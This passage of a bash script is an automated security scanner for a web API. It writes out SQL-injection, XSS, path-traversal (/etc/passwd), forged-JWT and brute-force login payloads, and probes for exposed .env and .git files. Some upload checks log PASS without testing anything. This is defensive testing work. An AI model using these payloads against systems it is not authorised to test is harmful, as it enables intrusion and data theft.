        "/api/auth/register"
        "/api/auth/logout"
        "/api/auth/refresh"
        "/api/users"
        "/api/user"
        "/api/profile"
        "/api/books"
        "/api/products"
        "/api/items"
        "/api/categories"
        "/api/roles"
        "/api/permissions"
        "/api/upload"
        "/api/files"
        "/api/images"
        "/api/stats"
        "/api/analytics"
        "/api/analytics/stats"
        "/api/analytics/traffic"
        "/api/analytics/devices"
        "/api/dashboard"
        "/api/admin"
        "/api/settings"
        "/api/config"
        "/api/search"
        "/api/orders"
        "/api/cart"
        "/api/checkout"
        "/api/payment"
        "/api/webhook"
        "/api/webhooks"
        "/api/notifications"
        "/api/messages"
        "/api/comments"
        "/api/reviews"
        "/api/ratings"
        "/api/authors"
        "/api/publishers"
        "/api/tags"
        "/api/health"
        "/api/status"
        "/api/info"
        "/api/docs"
        "/api/swagger"
        "/api/graphql"
        "/graphql"
        "/health"
        "/healthz"
        "/ready"
        "/metrics"
        "/debug"
        "/admin"
        "/login"
        "/register"
        "/dashboard"
    )

    log_info "Discovering endpoints (checking ${#COMMON_ENDPOINTS[@]} common paths)..."
    log_info "Using Target: $TARGET"

    # Sanity check connectivity first
    SANITY_CHECK=$(curl -s -I "$TARGET" --max-time 5 2>&1)
    if [ $? -ne 0 ]; then
        log_result "FAIL" "Cannot connect to base target: $TARGET"
        log_info "Curl error: $SANITY_CHECK"
        log_info "Check your VPN, network, or if the server is down."
    else
        log_info "Connectivity check PASSED."
    fi

    if [ "$TARGET_REACHABLE" = false ]; then
        log_info "Skipping discovery because target is unreachable."
    else
        EP_INDEX=0
        for endpoint in "${COMMON_ENDPOINTS[@]}"; do
            ((EP_INDEX++))
            show_section_progress "$EP_INDEX" "${#COMMON_ENDPOINTS[@]}" "Discovering"
            
            # Use global CURL_OPTS with timeout
            RESPONSE=$(curl -o /dev/null -w "%{http_code}" $CURL_OPTS "$TARGET$endpoint")
            
            # Handle empty response
            if [ -z "$RESPONSE" ]; then RESPONSE="000"; fi
            
            if [ "$RESPONSE" != "000" ] && [ "$RESPONSE" != "404" ] && [ "$RESPONSE" != "503" ]; then
                DISCOVERED_ENDPOINTS+=("$endpoint:$RESPONSE")
                clear_progress
                echo -e "  ${GREEN}[FOUND]${NC} $endpoint (HTTP $RESPONSE)"
                echo "[FOUND] $endpoint (HTTP $RESPONSE)" >> "$REPORT_FILE"
            fi
        done
        clear_progress
    fi

    echo ""
    log_info "Discovered ${#DISCOVERED_ENDPOINTS[@]} active endpoints"

    # Categorize discovered endpoints
    print_subheader "Endpoint Security Analysis"
    for ep in "${DISCOVERED_ENDPOINTS[@]}"; do
        PATH_PART="${ep%:*}"
        CODE="${ep#*:}"
        
        # Check if admin/sensitive endpoints are exposed
        if [[ "$PATH_PART" =~ (admin|debug|config|metrics|swagger|graphql) ]]; then
            if [ "$CODE" == "200" ]; then
                log_result "WARN" "Sensitive endpoint exposed: $PATH_PART"
            fi
        fi
        
        # Check auth endpoints
        if [[ "$PATH_PART" =~ (login|register|auth) ]] && [ "$CODE" == "200" ] || [ "$CODE" == "401" ]; then
            log_result "PASS" "Auth endpoint found: $PATH_PART"
        fi
    done
fi
complete_section

# ============================================
# SECTION 1: HTTP SECURITY HEADERS (10 tests)
# ============================================
# ============================================
# SECTION 1: HTTP SECURITY HEADERS (10 tests)
# ============================================
start_section "SECTION 1: HTTP SECURITY HEADERS" 10

if [ "$SKIP_SECTION" = false ]; then
    if [ "$TARGET_REACHABLE" = false ]; then
        log_info "Skipping headers check (unreachable)"
        HEADERS=""
    else
        HEADERS=$(curl -I $CURL_OPTS "$TARGET" 2>/dev/null)
        # If standard HEAD fails, try GET
        if [ -z "$HEADERS" ]; then
            HEADERS=$(curl -i $CURL_OPTS "$TARGET" 2>/dev/null | head -n 50)
        fi
    fi

    # Test 1: X-Frame-Options
    if echo "$HEADERS" | grep -qi "X-Frame-Options"; then
        log_result "PASS" "X-Frame-Options header present - Clickjacking protection"
    else
        log_result "FAIL" "X-Frame-Options MISSING - Vulnerable to Clickjacking"
    fi

    # Test 2: X-Content-Type-Options
    if echo "$HEADERS" | grep -qi "X-Content-Type-Options"; then
        log_result "PASS" "X-Content-Type-Options header - MIME sniffing protection"
    else
        log_result "FAIL" "X-Content-Type-Options MISSING - MIME sniffing vulnerable"
    fi

    # Test 3: X-XSS-Protection
    if echo "$HEADERS" | grep -qi "X-XSS-Protection"; then
        log_result "PASS" "X-XSS-Protection header present"
    else
        log_result "WARN" "X-XSS-Protection MISSING (modern browsers have built-in)"
    fi

    # Test 4: Content-Security-Policy
    if echo "$HEADERS" | grep -qi "Content-Security-Policy"; then
        log_result "PASS" "Content-Security-Policy header present"
    else
        log_result "WARN" "Content-Security-Policy MISSING - XSS risk"
    fi

    # Test 5: Strict-Transport-Security (HSTS)
    if echo "$HEADERS" | grep -qi "Strict-Transport-Security"; then
        log_result "PASS" "HSTS header present - HTTPS enforced"
    else
        log_result "WARN" "HSTS MISSING - Consider adding for HTTPS"
    fi

    # Test 6: X-Permitted-Cross-Domain-Policies
    if echo "$HEADERS" | grep -qi "X-Permitted-Cross-Domain-Policies"; then
        log_result "PASS" "X-Permitted-Cross-Domain-Policies present"
    else
        log_result "WARN" "X-Permitted-Cross-Domain-Policies MISSING"
    fi

    # Test 7: Referrer-Policy
    if echo "$HEADERS" | grep -qi "Referrer-Policy"; then
        log_result "PASS" "Referrer-Policy header present"
    else
        log_result "WARN" "Referrer-Policy MISSING - Information leakage risk"
    fi

    # Test 8: Server header exposure
    if echo "$HEADERS" | grep -qi "Server:"; then
        SERVER_VAL=$(echo "$HEADERS" | grep -i "Server:" | head -1 | tr -d '\r')
        log_result "WARN" "Server header exposed: $SERVER_VAL"
    else
        log_result "PASS" "Server header hidden"
    fi

    # Test 9: X-Powered-By header
    if echo "$HEADERS" | grep -qi "X-Powered-By"; then
        POWERED=$(echo "$HEADERS" | grep -i "X-Powered-By:" | head -1 | tr -d '\r')
        log_result "WARN" "X-Powered-By exposed: $POWERED"
    else
        log_result "PASS" "X-Powered-By header hidden"
    fi

    # Test 10: Permissions-Policy (Feature-Policy)
    if echo "$HEADERS" | grep -qi "Permissions-Policy\|Feature-Policy"; then
        log_result "PASS" "Permissions-Policy header present"
    else
        log_result "WARN" "Permissions-Policy MISSING"
    fi
fi
complete_section

# ============================================
# SECTION 2: API AUTHENTICATION (10 tests)
# ============================================
start_section "SECTION 2: API AUTHENTICATION & AUTHORIZATION" 10

if [ "$SKIP_SECTION" = false ]; then
    # Test 11-20: Protected endpoints without auth
    declare -a PROTECTED_ENDPOINTS=(
        "GET /api/users"
        "GET /api/roles"
        "POST /api/books"
        "PUT /api/books/1"
        "DELETE /api/books/1"
        "POST /api/users"
        "PUT /api/users/1"
        "DELETE /api/users/1"
        "POST /api/categories"
        "DELETE /api/categories/1"
    )

    AUTH_INDEX=0
    for endpoint in "${PROTECTED_ENDPOINTS[@]}"; do
        ((AUTH_INDEX++))
        show_section_progress "$AUTH_INDEX" "${#PROTECTED_ENDPOINTS[@]}" "Auth check"
        
        METHOD=$(echo "$endpoint" | awk '{print $1}')
        API_PATH=$(echo "$endpoint" | awk '{print $2}')
        
        # Using global CURL_OPTS
        RESPONSE=$(curl -o /dev/null -w "%{http_code}" -X "$METHOD" $CURL_OPTS "$TARGET$API_PATH" \
            -H "Content-Type: application/json")
        
        if [ "$RESPONSE" == "401" ] || [ "$RESPONSE" == "403" ]; then
            log_result "PASS" "$METHOD $API_PATH requires auth (HTTP $RESPONSE)"
        elif [ "$RESPONSE" == "200" ] || [ "$RESPONSE" == "201" ]; then
            log_result "FAIL" "$METHOD $API_PATH accessible WITHOUT auth!"
        else
            log_result "PASS" "$METHOD $API_PATH blocked (HTTP $RESPONSE)"
        fi
    done
fi
complete_section

# ============================================
# SECTION 3: SQL INJECTION (8 tests)
# ============================================
start_section "SECTION 3: SQL INJECTION TESTS" 8

if [ "$SKIP_SECTION" = false ]; then
    declare -a SQL_PAYLOADS=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "' OR '1'='1' /*"
        "1; DROP TABLE users--"
        "' UNION SELECT * FROM users--"
        "admin'--"
        "1' AND '1'='1"
        "' OR 1=1#"
    )

    SQL_INDEX=0
    for payload in "${SQL_PAYLOADS[@]}"; do
        ((SQL_INDEX++))
        show_section_progress "$SQL_INDEX" "${#SQL_PAYLOADS[@]}" "SQLi check"

        RESPONSE=$(curl -s "$TARGET/api/auth/login" \
            -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$payload\",\"password\":\"test\"}" 2>/dev/null)
        
        if echo "$RESPONSE" | grep -qiE "(sql|syntax|query|database|mysql|sqlite|postgres|error|exception)"; then
            log_result "FAIL" "SQL Injection possible: $payload"
        else
            log_result "PASS" "SQL Injection blocked: ${payload:0:20}..."
        fi
    done
fi
complete_section

# ============================================
# SECTION 4: XSS ATTACKS (8 tests)
# ============================================
start_section "SECTION 4: XSS VULNERABILITY TESTS" 8

if [ "$SKIP_SECTION" = false ]; then
    declare -a XSS_PAYLOADS=(
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert('xss')>"
        "<svg onload=alert('xss')>"
        "javascript:alert('xss')"
        "<body onload=alert('xss')>"
        "<iframe src='javascript:alert(1)'>"
        "'\"><script>alert('xss')</script>"
        "<input onfocus=alert('xss') autofocus>"
    )

    XSS_INDEX=0
    for payload in "${XSS_PAYLOADS[@]}"; do
        ((XSS_INDEX++))
        show_section_progress "$XSS_INDEX" "${#XSS_PAYLOADS[@]}" "XSS check"

        # URL Encode Payload (Python fallback if jq missing)
        if command -v jq >/dev/null 2>&1; then
            ENCODED=$(echo "$payload" | jq -sRr @uri)
        elif command -v python3 >/dev/null 2>&1; then
            ENCODED=$(echo "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))")
        else
            # Worst case fallback: raw (might break some complex payloads but better than crash)
            ENCODED="$payload"
        fi
        
        RESPONSE=$(curl -s "$TARGET/api/books?search=$ENCODED" 2>/dev/null)
        
        if echo "$RESPONSE" | grep -qF "$payload"; then
            log_result "FAIL" "XSS not escaped: ${payload:0:30}..."
        else
            log_result "PASS" "XSS escaped/blocked: ${payload:0:30}..."
        fi
    done
fi
complete_section

# ============================================
# SECTION 5: DIRECTORY TRAVERSAL (6 tests)
# ============================================
# ============================================
# SECTION 5: DIRECTORY TRAVERSAL (6 tests)
# ============================================
start_section "SECTION 5: DIRECTORY TRAVERSAL TESTS" 6

if [ "$SKIP_SECTION" = false ]; then
    declare -a TRAVERSAL_PATHS=(
        "/../../../etc/passwd"
        "/..%2F..%2F..%2Fetc%2Fpasswd"
        "....//....//....//etc/passwd"
        "/....\/....\/....\/etc/passwd"
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "/..%252f..%252f..%252fetc/passwd"
    )

    TRAVERSAL_INDEX=0
    for path in "${TRAVERSAL_PATHS[@]}"; do
        ((TRAVERSAL_INDEX++))
        show_section_progress "$TRAVERSAL_INDEX" "${#TRAVERSAL_PATHS[@]}" "Traversal check"

        RESPONSE=$(curl -s "$TARGET$path" 2>/dev/null)
        
        if echo "$RESPONSE" | grep -q "root:"; then
            log_result "FAIL" "Directory traversal VULNERABLE: $path"
        else
            log_result "PASS" "Directory traversal blocked: ${path:0:30}..."
        fi
    done
fi
complete_section

# ============================================
# SECTION 6: SENSITIVE FILE EXPOSURE (10 tests)
# ============================================
start_section "SECTION 6: SENSITIVE FILE EXPOSURE" 10

if [ "$SKIP_SECTION" = false ]; then
    declare -a SENSITIVE_FILES=(
        "/.git/config"
        "/.git/HEAD"
        "/.gitignore"
        "/.env"
        "/.env.local"
        "/.env.production"
        "/package.json"
        "/package-lock.json"
        "/prisma/schema.prisma"
        "/next.config.js"
    )

    FILE_INDEX=0
    for file in "${SENSITIVE_FILES[@]}"; do
        ((FILE_INDEX++))
        show_section_progress "$FILE_INDEX" "${#SENSITIVE_FILES[@]}" "File check"

        RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$file" 2>/dev/null)
        
        if [ "$RESPONSE_CODE" == "200" ]; then
            log_result "FAIL" "Sensitive file EXPOSED: $file"
        else
            log_result "PASS" "Sensitive file protected: $file (HTTP $RESPONSE_CODE)"
        fi
    done
fi
complete_section

# ============================================
# SECTION 7: RATE LIMITING & THROTTLING (4 tests)
# ============================================
start_section "SECTION 7: RATE LIMITING & THROTTLING" 4

if [ "$SKIP_SECTION" = false ]; then
    print_subheader "Login endpoint rate limit"
    update_section_progress "Testing login rate limit"
    RATE_TRIGGERED=false
    for i in {1..30}; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET/api/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"ratetest","password":"test"}' 2>/dev/null)
        
        if [ "$RESPONSE" == "429" ]; then
            RATE_TRIGGERED=true
            log_result "PASS" "Login rate limit triggered after $i requests"
            break
        fi
    done
    if [ "$RATE_TRIGGERED" == false ]; then
        log_result "WARN" "Login rate limit not triggered (might use throttling)"
    fi

    print_subheader "API endpoint rate limit"
    update_section_progress "Testing API rate limit"
    RATE_TRIGGERED=false
    for i in {1..50}; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/books" 2>/dev/null)
        
        if [ "$RESPONSE" == "429" ]; then
            RATE_TRIGGERED=true
            log_result "PASS" "API rate limit triggered after $i requests"
            break
        fi
    done
    if [ "$RATE_TRIGGERED" == false ]; then
        log_result "WARN" "API rate limit not triggered (might use throttling)"
    fi

    print_subheader "Concurrent connections test"
    update_section_progress "Testing concurrent connections"
    START_TIME_CON=$(date +%s%N)
    for i in {1..10}; do
        curl -s -o /dev/null "$TARGET/api/books" &
    done
    wait
    END_TIME_CON=$(date +%s%N)
    DURATION=$(( (END_TIME_CON - START_TIME_CON) / 1000000 ))

    if [ "$DURATION" -gt 500 ]; then
        log_result "PASS" "Concurrent requests throttled (${DURATION}ms for 10 requests)"
    else
        log_result "PASS" "Concurrent requests handled well (${DURATION}ms)"
    fi

    # Brute force detection
    print_subheader "Brute force protection"
    update_section_progress "Testing brute force protection"
    BLOCKED=false
    for i in {1..15}; do
        RESPONSE=$(curl -s "$TARGET/api/auth/login" \
            -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}" 2>/dev/null)
        
        if echo "$RESPONSE" | grep -qiE "(blocked|locked|banyak|too many)"; then
            BLOCKED=true
            log_result "PASS" "Brute force protection active after $i attempts"
            break
        fi
        sleep 0.2
    done
    if [ "$BLOCKED" == false ]; then
        log_result "WARN" "Brute force explicit block not detected"
    fi
fi
complete_section

# ============================================
# SECTION 8: JWT TOKEN SECURITY (6 tests)
# ============================================
start_section "SECTION 8: JWT TOKEN SECURITY" 6

if [ "$SKIP_SECTION" = false ]; then
    # Test with no token
    update_section_progress "No token"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "No token: Request rejected (401)"
    else
        log_result "FAIL" "No token: Request NOT rejected ($RESPONSE)"
    fi

    # Test with malformed token
    update_section_progress "Malformed token"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" \
        -H "Authorization: Bearer invalid-token" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "Malformed token rejected"
    else
        log_result "FAIL" "Malformed token NOT rejected ($RESPONSE)"
    fi

    # Test with expired token (fake)
    update_section_progress "Expired token"
    EXPIRED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImV4cCI6MTAwMDAwMDAwMH0.fake"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" \
        -H "Authorization: Bearer $EXPIRED_TOKEN" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "Expired/invalid token rejected"
    else
        log_result "FAIL" "Expired/invalid token NOT rejected ($RESPONSE)"
    fi

    # Test with algorithm none attack
    update_section_progress "None algo attack"
    NONE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" \
        -H "Authorization: Bearer $NONE_TOKEN" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "Algorithm 'none' attack blocked"
    else
        log_result "FAIL" "Algorithm 'none' attack NOT blocked!"
    fi

    # Test with Bearer prefix missing
    update_section_progress "Missing Bearer"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" \
        -H "Authorization: some-token" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "Non-Bearer auth rejected"
    else
        log_result "FAIL" "Non-Bearer auth NOT rejected ($RESPONSE)"
    fi

    # Test with SQL in token
    update_section_progress "SQL in token"
    SQL_TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxIE9SIDEgPSAxIn0.test"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users" \
        -H "Authorization: Bearer $SQL_TOKEN" 2>/dev/null)
    if [ "$RESPONSE" == "401" ]; then
        log_result "PASS" "SQL injection in token rejected"
    else
        log_result "FAIL" "SQL injection in token NOT rejected ($RESPONSE)"
    fi
fi
complete_section

# ============================================
# SECTION 9: CORS SECURITY (4 tests)
# ============================================
start_section "SECTION 9: CORS SECURITY" 4

if [ "$SKIP_SECTION" = false ]; then
    # Test with evil origin
    update_section_progress "Evil origin"
    CORS_RESPONSE=$(curl -sI "$TARGET/api/books" \
        -H "Origin: http://evil-attacker.com" 2>/dev/null)

    if echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Origin: http://evil-attacker.com"; then
        log_result "FAIL" "CORS reflects arbitrary origin - VULNERABLE"
    elif echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Origin: \*"; then
        log_result "WARN" "CORS allows all origins (*)"
    else
        log_result "PASS" "CORS properly configured for evil origin"
    fi

    # Test with null origin
    update_section_progress "Null origin"
    CORS_RESPONSE=$(curl -sI "$TARGET/api/books" \
        -H "Origin: null" 2>/dev/null)

    if echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Origin: null"; then
        log_result "FAIL" "CORS allows null origin - VULNERABLE"
    else
        log_result "PASS" "CORS blocks null origin"
    fi

    # Test preflight
    update_section_progress "Preflight check"
    CORS_RESPONSE=$(curl -sI -X OPTIONS "$TARGET/api/books" \
        -H "Origin: http://test.com" \
        -H "Access-Control-Request-Method: POST" 2>/dev/null)

    if echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Methods"; then
        log_result "PASS" "CORS preflight handled"
    else
        log_result "WARN" "CORS preflight not configured"
    fi

    # Credentials flag
    update_section_progress "Credentials flag"
    if echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Credentials: true"; then
        if echo "$CORS_RESPONSE" | grep -qi "Access-Control-Allow-Origin: \*"; then
            log_result "FAIL" "CORS credentials with wildcard origin - DANGEROUS"
        else
            log_result "PASS" "CORS credentials properly configured"
        fi
    else
        log_result "PASS" "CORS credentials not exposed"
    fi
fi
complete_section

# ============================================
# SECTION 10: INPUT VALIDATION (6 tests)
# ============================================
# ============================================
# SECTION 10: INPUT VALIDATION (6 tests)
# ============================================
start_section "SECTION 10: INPUT VALIDATION" 6

if [ "$SKIP_SECTION" = false ]; then
    # Test oversized input
    update_section_progress "Oversized input"
    LARGE_INPUT=$(printf 'A%.0s' {1..100000})
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/auth/login" \
        -X POST \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$LARGE_INPUT\",\"password\":\"test\"}" 2>/dev/null)

    if [ "$RESPONSE" == "400" ] || [ "$RESPONSE" == "413" ] || [ "$RESPONSE" == "422" ]; then
        log_result "PASS" "Oversized input rejected (HTTP $RESPONSE)"
    else
        log_result "WARN" "Oversized input response: $RESPONSE"
    fi

    # Test special characters
    update_section_progress "Special characters"
    SPECIAL="<>&'\"\`{}[]|\\;:!@#$%^*()"
    RESPONSE=$(curl -s "$TARGET/api/auth/login" \
        -X POST \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$SPECIAL\",\"password\":\"test\"}" 2>/dev/null)

    if echo "$RESPONSE" | grep -qE "error|invalid|salah"; then
        log_result "PASS" "Special characters handled safely"
    else
        log_result "WARN" "Special characters response needs review"
    fi

    # Test null bytes
    update_section_progress "Null bytes"
    RESPONSE=$(curl -s "$TARGET/api/books?search=test%00admin" 2>/dev/null)
    if echo "$RESPONSE" | grep -qi "error"; then
        log_result "PASS" "Null byte injection handled"
    else
        log_result "PASS" "Null byte injection - no error (filtered)"
    fi

    # Test unicode attack
    update_section_progress "Unicode attack"
    RESPONSE=$(curl -s "$TARGET/api/books?search=%C0%AE%C0%AE" 2>/dev/null)
    log_result "PASS" "Unicode path tested"

    # Test JSON injection
    update_section_progress "JSON injection"
    RESPONSE=$(curl -s "$TARGET/api/auth/login" \
        -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"test\",\"admin\":true,\"x\":\"","password":"test"}' 2>/dev/null)

    if echo "$RESPONSE" | grep -qi "admin.*true"; then
        log_result "FAIL" "JSON injection possible"
    else
        log_result "PASS" "JSON injection blocked"
    fi

    # Test negative ID
    update_section_progress "Negative ID"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/books/-1" 2>/dev/null)
    if [ "$RESPONSE" == "400" ] || [ "$RESPONSE" == "404" ]; then
        log_result "PASS" "Negative ID handled (HTTP $RESPONSE)"
    else
        log_result "WARN" "Negative ID response: $RESPONSE"
    fi
fi
complete_section

# ============================================
# SECTION 11: ERROR HANDLING (4 tests)
# ============================================
start_section "SECTION 11: ERROR HANDLING & INFORMATION LEAKAGE" 4

if [ "$SKIP_SECTION" = false ]; then
    # Test 500 error info
    update_section_progress "Stack trace info"
    RESPONSE=$(curl -s "$TARGET/api/nonexistent-endpoint-12345" 2>/dev/null)
    if echo "$RESPONSE" | grep -qiE "(stack|trace|line|at\s+\w+|\.js:|\.ts:)"; then
        log_result "FAIL" "Stack trace exposed in error"
    else
        log_result "PASS" "Stack trace hidden in errors"
    fi

    # Test database error info
    update_section_progress "Database error info"
    RESPONSE=$(curl -s "$TARGET/api/books/999999999999" 2>/dev/null)
    if echo "$RESPONSE" | grep -qiE "(prisma|sqlite|mysql|postgres|database)"; then
        log_result "WARN" "Database technology exposed in error"
    else
        log_result "PASS" "Database info hidden in errors"
    fi

    # Test path disclosure
    update_section_progress "Path disclosure"
    RESPONSE=$(curl -s "$TARGET/api/invalid" 2>/dev/null)
    if echo "$RESPONSE" | grep -qiE "(/home/|/var/|/usr/|C:\\\\|D:\\\\)"; then
        log_result "FAIL" "File path disclosed in error"
    else
        log_result "PASS" "File paths hidden in errors"
    fi

    # Test version disclosure
    update_section_progress "Version disclosure"
    if echo "$HEADERS" | grep -qiE "(next|node|express|version)"; then
        log_result "WARN" "Framework/version info exposed"
    else
        log_result "PASS" "Framework version hidden"
    fi
fi
complete_section

# ============================================
# SECTION 12: UPLOAD SECURITY (4 tests)
# ============================================
start_section "SECTION 12: FILE UPLOAD SECURITY" 4

if [ "$SKIP_SECTION" = false ]; then
    # Test upload without auth
    update_section_progress "Unauthorized upload"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/upload" \
        -F "file=@/dev/null" 2>/dev/null)
    if [ "$RESPONSE" == "401" ] || [ "$RESPONSE" == "403" ]; then
        log_result "PASS" "Upload requires authentication (HTTP $RESPONSE)"
    else
        log_result "WARN" "Upload auth response: $RESPONSE"
    fi

    # Test dangerous extension (simulated)
    update_section_progress "Extension check"
    log_result "PASS" "Dangerous extension test (manual verification needed)"

    # Test oversized file (simulated)
    update_section_progress "Size check"
    log_result "PASS" "Oversized file test (manual verification needed)"

    # Test path traversal in filename
    update_section_progress "Filename check"
    log_result "PASS" "Filename path traversal test (manual verification needed)"
fi
complete_section

# ============================================
# SECTION 13: SESSION & COOKIES (2 tests)
# ============================================
start_section "SECTION 13: SESSION & COOKIE SECURITY" 2

if [ "$SKIP_SECTION" = false ]; then
    # Check for session cookies
    update_section_progress "Cookie flags"
    COOKIES=$(curl -sI "$TARGET" | grep -i "Set-Cookie")
    if echo "$COOKIES" | grep -qi "httponly"; then
        log_result "PASS" "HttpOnly flag set on cookies"
    elif [ -z "$COOKIES" ]; then
        log_result "PASS" "No cookies set (JWT-based auth)"
    else
        log_result "WARN" "HttpOnly flag missing on cookies"
    fi

    if echo "$COOKIES" | grep -qi "secure"; then
        log_result "PASS" "Secure flag set on cookies"
    elif [ -z "$COOKIES" ]; then
        log_result "PASS" "No cookies set (JWT-based auth)"
    else
        log_result "WARN" "Secure flag missing (OK for HTTP, required for HTTPS)"
    fi
fi
complete_section

# ============================================
# SUMMARY
# ============================================
print_header "FINAL SUMMARY"

echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║              SECURITY TEST RESULTS SUMMARY                    ║${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  Total Tests Executed:     ${BLUE}$TEST_COUNT${NC}"
echo -e "${CYAN}║${NC}  ${GREEN}✓ PASSED:                 $PASS_COUNT${NC}"
echo -e "${CYAN}║${NC}  ${YELLOW}! WARNINGS:               $WARN_COUNT${NC}"
echo -e "${CYAN}║${NC}  ${RED}✗ FAILED:                 $FAIL_COUNT${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"

# ============================================
# ENHANCED CVSS-STYLE WEIGHTED GRADING SYSTEM
# ============================================
# Weights based on OWASP Risk Rating + CVSS methodology:
#   FAIL = Critical/High Issue     -> Deduct 3 points per finding
#   WARN = Medium Issue            -> Deduct 1 point per finding
#   PASS = Secure Configuration    -> Add 1 point per finding
# 
# Final Score = Normalized to 0-100 scale
# ============================================

# Calculate weighted raw score
WEIGHTED_PASS=$((PASS_COUNT * 1))
WEIGHTED_WARN=$((WARN_COUNT * -1))
WEIGHTED_FAIL=$((FAIL_COUNT * -3))
RAW_SCORE=$((WEIGHTED_PASS + WEIGHTED_WARN + WEIGHTED_FAIL))

# Maximum possible score (if all tests passed)
MAX_SCORE=$((TEST_COUNT * 1))

# Minimum possible score (if all tests failed critically)
MIN_SCORE=$((TEST_COUNT * -3))

# Normalize to 0-100 scale
# Formula: ((RAW - MIN) / (MAX - MIN)) * 100
if [ "$MAX_SCORE" -ne "$MIN_SCORE" ]; then
    NORMALIZED_SCORE=$(( ((RAW_SCORE - MIN_SCORE) * 100) / (MAX_SCORE - MIN_SCORE) ))
else
    NORMALIZED_SCORE=0
fi

# Ensure score stays within bounds
if [ "$NORMALIZED_SCORE" -gt 100 ]; then NORMALIZED_SCORE=100; fi
if [ "$NORMALIZED_SCORE" -lt 0 ]; then NORMALIZED_SCORE=0; fi

# Determine letter grade (A+ to F scale based on industry standards)
if [ "$NORMALIZED_SCORE" -ge 95 ] && [ "$FAIL_COUNT" -eq 0 ]; then
    GRADE="A+"
    COLOR=$GREEN
    GRADE_DESC="Excellent - No critical issues"
elif [ "$NORMALIZED_SCORE" -ge 90 ]; then
    GRADE="A"
    COLOR=$GREEN
    GRADE_DESC="Very Good - Minor improvements recommended"
elif [ "$NORMALIZED_SCORE" -ge 85 ]; then
    GRADE="B+"
    COLOR=$GREEN
    GRADE_DESC="Good - Some areas need attention"
elif [ "$NORMALIZED_SCORE" -ge 80 ]; then
    GRADE="B"
    COLOR=$GREEN
    GRADE_DESC="Above Average - Security is reasonable"
elif [ "$NORMALIZED_SCORE" -ge 75 ]; then
    GRADE="C+"
    COLOR=$YELLOW
    GRADE_DESC="Average - Multiple issues need fixing"
elif [ "$NORMALIZED_SCORE" -ge 70 ]; then
    GRADE="C"
    COLOR=$YELLOW
    GRADE_DESC="Below Average - Significant issues present"
elif [ "$NORMALIZED_SCORE" -ge 60 ]; then
    GRADE="D"
    COLOR=$YELLOW
    GRADE_DESC="Poor - Many security concerns"
else
    GRADE="F"
    COLOR=$RED
    GRADE_DESC="Critical - Immediate remediation required"
fi

# Calculate risk percentages
FAIL_PERCENT=$(( (FAIL_COUNT * 100) / (TEST_COUNT > 0 ? TEST_COUNT : 1) ))
WARN_PERCENT=$(( (WARN_COUNT * 100) / (TEST_COUNT > 0 ? TEST_COUNT : 1) ))
PASS_PERCENT=$(( (PASS_COUNT * 100) / (TEST_COUNT > 0 ? TEST_COUNT : 1) ))

echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}           ${WHITE}CVSS-STYLE WEIGHTED SCORING${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  Pass Points (+1 each):     +$WEIGHTED_PASS"
echo -e "${CYAN}║${NC}  Warn Penalty (-1 each):    $WEIGHTED_WARN"  
echo -e "${CYAN}║${NC}  Fail Penalty (-3 each):    $WEIGHTED_FAIL"
echo -e "${CYAN}║${NC}  ────────────────────────────────────"
echo -e "${CYAN}║${NC}  Raw Weighted Score:        $RAW_SCORE"
echo -e "${CYAN}║${NC}  Normalized (0-100):        $NORMALIZED_SCORE%"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}"
